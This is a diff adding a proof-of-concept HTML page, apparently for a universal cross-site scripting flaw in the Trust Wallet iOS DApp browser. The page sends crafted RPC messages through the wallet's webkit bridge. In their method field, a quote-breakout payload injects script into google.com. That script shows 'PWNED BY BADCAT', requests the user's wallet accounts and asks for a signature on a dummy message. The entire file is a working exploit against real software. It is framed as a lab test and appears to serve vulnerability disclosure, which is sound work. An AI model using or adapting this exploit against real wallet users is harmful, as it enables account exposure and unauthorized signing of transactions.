@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>Trust Wallet iOS RPC error UXSS lab</title>
+</head>
+<body>
+  <a id="run" href="https://google.com/">RUN</a>
+  <pre id="status">PoC lab</pre>
+
+  <script>
+    'use strict';
+
+    const runLink = document.querySelector('#run');
+    const status = document.querySelector('#status');
+    const target = 'https://google.com/';
+    const dummyMessage =
+      'Trust Wallet UXSS lab test only. No authorization or asset transfer.';
+    const dummyMessageHex = '0x' + Array.from(
+      new TextEncoder().encode(dummyMessage),
+      byte => byte.toString(16).padStart(2, '0')
+    ).join('');
+
+    const impactStatements = [
+      '(async () => {',
+      String.raw`if (!/(^|\.)google\.com$/.test(location.hostname)) return;`,
+      'if (window.__twUxssLab) return;',
+      'const provider = window.ethereum;',
+      "if (!provider || typeof provider.request !== 'function') return;",
+      'window.__twUxssLab = true;',
+      "document.body?.insertAdjacentHTML('afterbegin', '<h1 id=tw-uxss-lab>PWNED BY BADCAT</h1>');alert(document.domain);",
+      'let accounts;',
+      "try { accounts = await provider.request({method: 'eth_requestAccounts'}); }",
+      "catch (error) { console.log('UXSS lab: connect ditolak', String(error)); return; }",
+      'if (!accounts?.[0]) return;',
+      `try { await provider.request({method: 'personal_sign', params: [${JSON.stringify(dummyMessageHex)}, accounts[0]]}); }`,
+      "catch (error) { console.log('UXSS lab: sign dummy ditolak', String(error)); }",
+      '})();'
+    ];
+    const marker = `zz_");${impactStatements.join(' ')}//`;
+
+    runLink.addEventListener('click', event => {
+      event.preventDefault();
+
+      const bridge = window.webkit?.messageHandlers?._tw_;
+      if (!bridge || typeof bridge.postMessage !== 'function' ||
+          !window.trustwallet?.ethereum) {
+        status.textContent =
+          'Buka halaman ini pada DApp browser Trust Wallet iOS 26.38.10.';
+        return;
+      }
+
+      const baseId = Math.trunc(Date.now() % 9000000000000000);
+      let sent = 0;
+
+      for (let i = 0; i < 8; i++) {
+        try {
+          bridge.postMessage({
+            id: baseId + i,
+            network: 'ethereum',
+            name: 'rpcCall',
+            object: {
+              method: marker,
+              params: [],
+              jsonrpc: '2.0'
+            }
+          });
+          sent++;
+        } catch (error) {
+          status.textContent =
+            `Bridge menolak request ke-${i + 1}: ${String(error)}`;
+          break;
+        }
+      }
+
+      status.textContent = `${sent} request RPC dikirim; navigasi ke ${target}`;
+      setTimeout(() => location.assign(target), 120);
+    }, {once: true});
+  </script>
+</body>
+</html>
